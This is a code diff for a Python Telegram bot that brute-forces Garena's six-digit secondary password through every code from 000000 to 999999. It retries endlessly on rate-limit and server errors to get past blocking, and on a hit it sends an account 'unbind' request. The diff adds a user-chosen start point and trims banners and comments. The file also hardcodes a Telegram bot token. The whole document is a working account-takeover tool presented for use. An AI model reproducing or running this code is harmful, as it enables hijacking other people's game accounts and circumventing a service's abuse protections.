@@ -18,7 +18,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ==================== CONFIGURATION ====================
 BOT_TOKEN = "8310387756:AAEpmT2Qqjl5atmwGnvR9nY9xD3QX35ID_E"  # আপনার টেলিগ্রাম টোকেন
-MAX_THREADS_PER_TOKEN = 4   # ব্লক এড়ানোর জন্য পারফেক্ট এবং নিরাপদ থ্রেড লিমিট
+MAX_THREADS_PER_TOKEN = 4   # সার্ভার ব্লক এড়াতে নিরাপদ থ্রেড লিমিট
 MAX_TOTAL_TOKENS = 10
 REQUEST_TIMEOUT = 10
 RETRY_COUNT = 5
@@ -57,25 +57,15 @@ class Colors:
     BOLD = '\033[1m'
     END = '\033[0m'
 
-RGB_COLORS = [
-    '\033[38;2;255;0;0m',
-    '\033[38;2;255;128;0m',
-    '\033[38;2;255;255;0m',
-    '\033[38;2;0;255;0m',
-    '\033[38;2;0;255;255m',
-    '\033[38;2;0;0;255m',
-    '\033[38;2;255;0;255m',
-    '\033[38;2;255;0;128m',
-]
-
 ANIMATION_FRAMES = ['⚡ [■□□□□□□□□□]', '🔥 [■■■□□□□□□□]', '🚀 [■■■■■□□□□□]', '💎 [■■■■■■■□□□]', '🎯 [■■■■■■■■■■]']
 EMOJIS = ['🔓', '🔑', '⚡', '💻', '🎯', '🚀', '🔥', '⚙️']
 
 class TokenTask:
-    def __init__(self, task_id, token_number, access_token, chat_id, context):
+    def __init__(self, task_id, token_number, access_token, start_from, chat_id, context):
         self.task_id = task_id
         self.token_number = token_number
         self.access_token = access_token
+        self.start_from = start_from
         self.email = None
         self.chat_id = chat_id
         self.context = context
@@ -84,39 +74,20 @@ class TokenTask:
         self.attempted_count = 0
         self.successful_count = 0
         self.failed_count = 0
-        self.blocked_count = 0      # সার্ভার ব্লক বা লিমিট খাওয়ার কাউন্টার
-        self.recovered_count = 0    # ব্লক খেয়ে সফলভাবে রিকভার হওয়া রিকোয়েস্ট
+        self.blocked_count = 0      
+        self.recovered_count = 0    
         self.found_code = None
         self.found_identity_token = None
         self.start_time = None
         self.message = None  
         self.completed = False
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
 def print_banner():
-    clear_screen()
-    banner = f"""
-{RGB_COLORS[0]}{Colors.BOLD}╔══════════════════════════════════════════════════════╗{Colors.END}
-{RGB_COLORS[1]}{Colors.BOLD}║        🎮 GARENA UNBIND TELEGRAM BOT 🎮            ║{Colors.END}
-{RGB_COLORS[2]}{Colors.BOLD}║     100% UNBREAKABLE INFINITE RETRY BRUTE FORCE      ║{Colors.END}
-{RGB_COLORS[3]}{Colors.BOLD}╚══════════════════════════════════════════════════════╝{Colors.END}
-
-{RGB_COLORS[4]}⊛ {Colors.WHITE}STATUS    : {Colors.GREEN}ONLINE (SMART AUTO-RECOVERY){Colors.END}
-{RGB_COLORS[5]}⊛ {Colors.WHITE}THREADS   : {Colors.YELLOW}{MAX_THREADS_PER_TOKEN} per token{Colors.END}
-{RGB_COLORS[6]}⊛ {Colors.WHITE}MAX TOKENS: {Colors.MAGENTA}{MAX_TOTAL_TOKENS}{Colors.END}
-{RGB_COLORS[7]}⊛ {Colors.WHITE}VERSION   : {Colors.CYAN}7.0 ZERO-DROP ENGINE{Colors.END}
-
-{Colors.CYAN}●{"═" * 50}●{Colors.END}
-{Colors.GREEN}✅ Bot Starting...{Colors.END}
-{Colors.YELLOW}⚡ Waiting for commands...{Colors.END}
-{Colors.CYAN}●{"═" * 50}●{Colors.END}
-"""
-    print(banner)
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"{Colors.GREEN}[+] Telegram Zero-Drop Brute-Force Bot Running Successfully...{Colors.END}")
+    print(f"{Colors.CYAN}[+] All logs & animations are now redirected to Telegram.{Colors.END}")
 
 def test_code_with_infinite_retry(task, code, headers):
-    """Test single code with Infinite Anti-Block & Auto-Recovery mechanism"""
     if task.stop_flag:
         return None, None
     
@@ -130,7 +101,6 @@ def test_code_with_infinite_retry(task, code, headers):
         "secondary_password": hashed_sec_code
     }
     
-    # Infinite loop until the specific request successfully hits the server and returns a definitive response
     while not task.stop_flag:
         try:
             response = session.post(
@@ -143,8 +113,6 @@ def test_code_with_infinite_retry(task, code, headers):
             
             if response and response.status_code == 200:
                 res_json = response.json()
-                
-                # Check if correct code found
                 if "identity_token" in res_json and res_json.get("identity_token"):
                     with lock:
                         if not task.stop_flag:
@@ -155,26 +123,22 @@ def test_code_with_infinite_retry(task, code, headers):
                             task.completed = True
                     return code, res_json.get("identity_token")
                 else:
-                    # Valid response received (Code was wrong, but server processed it)
                     with lock:
                         task.failed_count += 1
                     break 
                     
             elif response.status_code in [429, 500, 502, 503, 504]:  
-                # Server Blocked (Rate Limited) or Server Error -> MUST RETRY
                 with lock:
                     task.blocked_count += 1
-                time.sleep(2.0)  # Cool down delay to bypass block safely
+                time.sleep(2.0)  
                 continue
             else:
-                # Other client/server errors, retry after short pause to ensure 0 loss
                 with lock:
                     task.blocked_count += 1
                 time.sleep(1.0)
                 continue
                 
         except Exception as e:
-            # Network drop, timeout or proxy/connection error -> RE-TRY UNTIL SUCCESSFUL
             with lock:
                 task.blocked_count += 1
             time.sleep(1.5)
@@ -227,28 +191,30 @@ def create_telegram_progress(task):
     speed = task.attempted_count / elapsed if elapsed > 0 else 0
     
     total_codes = 1000000
-    progress = min((task.attempted_count / total_codes) * 100, 100)
+    scanned_total = task.attempted_count
+    progress = min((scanned_total / total_codes) * 100, 100)
     bar_length = 15
     filled = int(bar_length * progress / 100)
     bar = '▓' * filled + '░' * (bar_length - filled)
     
-    anim_box = ANIMATION_FRAMES[task.attempted_count % len(ANIMATION_FRAMES)]
-    emoji = EMOJIS[(task.attempted_count // 15) % len(EMOJIS)]
+    anim_box = ANIMATION_FRAMES[scanned_total % len(ANIMATION_FRAMES)]
+    emoji = EMOJIS[(scanned_total // 15) % len(EMOJIS)]
     
     text = (
-        f"{emoji} **ZERO-DROP BRUTE ENGINE** {emoji}\n"
+        f"{emoji} **TELEGRAM ZERO-DROP ENGINE** {emoji}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔹 **Token ID** : `#{task.token_number}`\n"
-        f"📧 **Email**    : `{task.email if task.email else 'Loading...'}`\n"
-        f"🎯 **Target**   : `{task.current_code if task.current_code else '000000'}`\n"
+        f"🔹 **Token ID**  : `#{task.token_number}`\n"
+        f"📧 **Email**     : `{task.email if task.email else 'Loading...'}`\n"
+        f"🎯 **Target**    : `{task.current_code if task.current_code else '000000'}`\n"
+        f"🚀 **Start From**: `{task.start_from:06d}`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 **Progress** : {bar} `{progress:.2f}%`\n"
-        f"📈 **Scanned**  : `{task.attempted_count:,}` / `{total_codes:,}`\n"
-        f"🛡️ **Blocks/Errors Hit** : `{task.blocked_count:,}`\n"
-        f"🔄 **Auto-Recovered** : `{task.recovered_count:,}`\n"
-        f"⚡ **Speed**    : `{speed:.0f} codes/sec`\n"
-        f"⏱️ **Elapsed**  : `{elapsed:.1f}s`\n"
-        f"✨ **Status**   : {anim_box}\n"
+        f"📊 **Progress**  : {bar} `{progress:.2f}%`\n"
+        f"📈 **Scanned**   : `{scanned_total:,}` / `{total_codes:,}`\n"
+        f"🛡️ **Blocks Hit**  : `{task.blocked_count:,}`\n"
+        f"🔄 **Recovered** : `{task.recovered_count:,}`\n"
+        f"⚡ **Speed**     : `{speed:.0f} codes/sec`\n"
+        f"⏱️ **Elapsed**   : `{elapsed:.1f}s`\n"
+        f"✨ **Status**    : {anim_box}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     )
     return text
@@ -264,20 +230,26 @@ async def run_single_token_bruteforce(task, headers):
                     await task.message.edit_text(text, parse_mode='Markdown')
             except Exception:
                 pass
-            await asyncio.sleep(2.5)  # Refresh animation smoothly
+            await asyncio.sleep(2.5)  
     
     progress_task = asyncio.create_task(update_progress())
     
     def run_bruteforce():
         with ThreadPoolExecutor(max_workers=MAX_THREADS_PER_TOKEN) as executor:
             batch_size = MAX_THREADS_PER_TOKEN * 30
-            current_start = 0
             
-            while current_start < 1000000 and not task.stop_flag:
-                batch_end = min(current_start + batch_size, 1000000)
+            # কাস্টম স্টার্ট পয়েন্ট থেকে শুরু করে ১০ লক্ষ পর্যন্ত এবং বাকিটা আবার শুরুতে ফিরে লুপ হবে (Full 1M coverage)
+            range_list = list(range(task.start_from, 1000000)) + list(range(0, task.start_from))
+            
+            current_idx = 0
+            total_range_len = len(range_list)
+            
+            while current_idx < total_range_len and not task.stop_flag:
+                batch_end = min(current_idx + batch_size, total_range_len)
+                batch = range_list[current_idx:batch_end]
                 futures = []
                 
-                for i in range(current_start, batch_end):
+                for i in batch:
                     if task.stop_flag:
                         break
                     code = f"{i:06d}"
@@ -298,7 +270,7 @@ async def run_single_token_bruteforce(task, headers):
                 
                 if task.stop_flag:
                     break
-                current_start = batch_end
+                current_idx = batch_end
     
     loop = asyncio.get_event_loop()
     await loop.run_in_executor(None, run_bruteforce)
@@ -313,7 +285,7 @@ async def run_single_token_bruteforce(task, headers):
             f"📧 **Email:** `{task.email}`\n"
             f"🔑 **Code:** `{task.found_code}`\n"
             f"🔢 **Total Scanned:** {task.attempted_count:,}\n"
-            f"🛡️ **Total Blocks Bypassed:** {task.blocked_count:,}\n"
+            f"🛡️ **Blocks Bypassed:** {task.blocked_count:,}\n"
             f"⏱ **Time Taken:** {elapsed:.2f}s\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"📤 **Dispatching Unbind Request...**"
@@ -334,11 +306,11 @@ async def run_single_token_bruteforce(task, headers):
             await task.message.edit_text(final_text, parse_mode='Markdown')
     else:
         if task.message and not task.found_code:
-            await task.message.edit_text(f"❌ **Token #{task.token_number} Finished**\nScanned with 0-Drop Anti-Block engine.", parse_mode='Markdown')
+            await task.message.edit_text(f"❌ **Token #{task.token_number} Finished**\nScanned with Zero-Drop Engine.", parse_mode='Markdown')
             
     task.completed = True
 
-async def add_new_token(access_token, chat_id, context, user_id):
+async def add_new_token(access_token, start_from, chat_id, context, user_id):
     user_tasks = active_tasks.get(user_id, {}).get('tasks', {})
     current_count = len([t for t in user_tasks.values() if not t.completed])
     
@@ -353,12 +325,12 @@ async def add_new_token(access_token, chat_id, context, user_id):
     
     token_number = len(user_tasks) + 1
     task_id = str(uuid.uuid4())
-    task = TokenTask(task_id, token_number, access_token, chat_id, context)
+    task = TokenTask(task_id, token_number, access_token, start_from, chat_id, context)
     task.email = email
     
     msg = await context.bot.send_message(
         chat_id=chat_id,
-        text=f"🔍 **Initializing Token #{token_number} with Zero-Drop Engine...**\n📧 Email: `{email}`",
+        text=f"🔍 **Initializing Token #{token_number}**\n📧 Email: `{email}`\n🚀 Start From: `{start_from:06d}`",
         parse_mode='Markdown'
     )
     task.message = msg
@@ -376,41 +348,65 @@ async def add_new_token(access_token, chat_id, context, user_id):
     
     asyncio.create_task(run_single_token_bruteforce(task, headers))
 
-# Telegram Handlers
+# Telegram Handlers (Step-by-Step Interactive Flow)
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
-        "🎮 **GARENA ZERO-DROP UNBIND BOT** 🎮\n\n"
+        "🎮 **TELEGRAM EXCLUSIVE UNBIND BOT** 🎮\n\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "✨ **Key Improvements:**\n"
-        "• 100% Infinite Retry on Server Block\n"
-        "• Zero Code Drop Guarantee\n"
-        "• Real-time Block/Error Counter\n"
+        "✨ **Features:**\n"
+        "• 100% Terminal Free (All live on Telegram)\n"
+        "• Custom Start Point Selection\n"
+        "• Infinite Anti-Block & Auto-Recovery\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "👇 Click below to add your token!"
     )
     keyboard = [
-        [InlineKeyboardButton("🔑 Add Token", callback_data="token")],
+        [InlineKeyboardButton("🔑 Add Token & Configure", callback_data="token")],
         [InlineKeyboardButton("🛑 Stop All Tasks", callback_data="stop")]
     ]
     await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def token_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.user_data['waiting_for_token'] = True
-    await update.message.reply_text("🔑 **Please send your Garena Access Token below:**", parse_mode='Markdown')
+    context.user_data['step'] = 'waiting_for_token'
+    await update.message.reply_text("🔑 **Step 1/2:** Please send your Garena Access Token below:", parse_mode='Markdown')
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
     message_text = update.message.text.strip()
     
-    if context.user_data.get('waiting_for_token'):
-        context.user_data['waiting_for_token'] = False
+    step = context.user_data.get('step')
+    
+    if step == 'waiting_for_token':
         if len(message_text) < 10:
-            await update.message.reply_text("❌ Invalid token format!")
+            await update.message.reply_text("❌ Invalid token format! Please send a valid access token.")
             return
-        await update.message.reply_text("✅ Token accepted! Initializing Zero-Drop engine...", parse_mode='Markdown')
+        
+        context.user_data['temp_token'] = message_text
+        context.user_data['step'] = 'waiting_for_start_point'
+        
+        await update.message.reply_text(
+            "🚀 **Step 2/2:** Enter the **Start Point** (e.g., `0`, `150000`, `500000`).\n"
+            "*(Or type `0` to start from the very beginning `000000`)*",
+            parse_mode='Markdown'
+        )
+        
+    elif step == 'waiting_for_start_point':
         try:
-            await add_new_token(message_text, chat_id, context, user_id)
+            start_from = int(message_text)
+            if not (0 <= start_from <= 999999):
+                raise ValueError()
+        except ValueError:
+            await update.message.reply_text("❌ Please enter a valid number between `0` and `999999`.")
+            return
+        
+        access_token = context.user_data.get('temp_token')
+        context.user_data['step'] = None
+        
+        await update.message.reply_text(f"✅ Configuration received! Starting brute force from `{start_from:06d}`...", parse_mode='Markdown')
+        
+        try:
+            await add_new_token(access_token, start_from, chat_id, context, user_id)
         except Exception as e:
             await update.message.reply_text(f"❌ Error: {str(e)}")
 
@@ -425,8 +421,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     if query.data == "token":
-        context.user_data['waiting_for_token'] = True
-        await query.edit_message_text("🔑 Please send your Garena Access Token:")
+        context.user_data['step'] = 'waiting_for_token'
+        await query.edit_message_text("🔑 **Step 1/2:** Please send your Garena Access Token:")
     elif query.data == "stop":
         user_id = update.effective_user.id
         for task in active_tasks.get(user_id, {}).get('tasks', {}).values():
@@ -443,7 +439,6 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     application.add_handler(CallbackQueryHandler(button_callback))
     
-    print(f"{Colors.GREEN}✅ Zero-Drop Telegram Bot is running successfully!{Colors.END}")
     application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 if __name__ == "__main__":
